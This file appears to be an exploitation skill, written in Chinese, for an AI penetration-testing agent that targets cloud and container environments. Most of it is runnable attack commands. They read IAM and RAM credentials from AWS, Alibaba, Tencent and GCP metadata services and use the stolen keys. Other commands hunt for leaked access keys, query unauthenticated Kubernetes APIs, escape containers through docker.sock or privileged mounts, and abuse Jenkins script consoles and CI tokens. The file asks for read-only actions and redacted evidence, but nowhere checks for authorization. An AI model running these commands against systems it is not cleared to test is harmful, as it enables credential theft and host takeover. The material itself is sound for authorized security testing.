---
name: cloud-container
description: 云与容器：AK/SK 泄露利用、元数据服务、K8s API 未授权与逃逸、docker socket、CI 凭据
whenToUse: 目标在云上（阿里云/AWS/腾讯云/GCP）、有 K8s、或有 CI/CD 与容器特征
role: exploit
enabled: true
---

# 云与容器

## 元数据（先确认在不在云上）

~~~bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 阿里云
curl -s http://100.100.100.200/latest/meta-data/
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 腾讯云
curl -s http://metadata.tencentyun.com/latest/meta-data/
# GCP（带 Header）
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/
~~~

~~~bash
AWS_ACCESS_KEY_ID=xx AWS_SECRET_ACCESS_KEY=yy AWS_SESSION_TOKEN=zz aws sts get-caller-identity
aws s3 ls
aliyun sts GetCallerIdentity
~~~

## AK/SK 泄露点

~~~
前端打包产物：grep -rE 'LTAI[0-9A-Za-z]{12,}|AKIA[0-9A-Z]{16}' .
GitHub 历史：trufflehog / gitleaks
heapdump / actuator env
APK assets 与 strings.xml、小程序反编译
~~~

## K8s

~~~bash
curl -sk https://TARGET:6443/api/v1/namespaces
curl -sk https://TARGET:6443/api/v1/pods
kubectl --server=https://TARGET:6443 --token=TOKEN --insecure-skip-tls-verify get pods -A
kubectl auth can-i --list
~~~

## 容器逃逸

~~~
1. docker socket：ls /var/run/docker.sock -> docker -H unix:///var/run/docker.sock run -v /:/mnt alpine chroot /mnt
2. privileged：capsh --print 看 cap_sys_admin -> mount /dev/sda1 /mnt
3. hostPath 挂载：mount | grep -i host
4. cgroup v1 release_agent
5. 内核漏洞（先看 uname -r 与补丁级别）
~~~

## CI/CD

~~~
Jenkins：/script（Groovy RCE）、/jm/api/json 未授权
GitLab：CI_JOB_TOKEN、暴露的 .gitlab-ci.yml 变量
GitHub Actions：workflow 里的 secrets 引用名
~~~

## 判据

- 元数据能读 = SSRF 或已落地；STS 能调 API = 拿到云身份
- K8s：get pods -A 成功 = 只读；能 exec = 集群写
- 落库 category=unauthorized / privesc，evidence 贴凭据指纹（**前 8 位 + 长度，不贴完整 secret**）
- 云上动作只读优先（list/describe），不 delete/create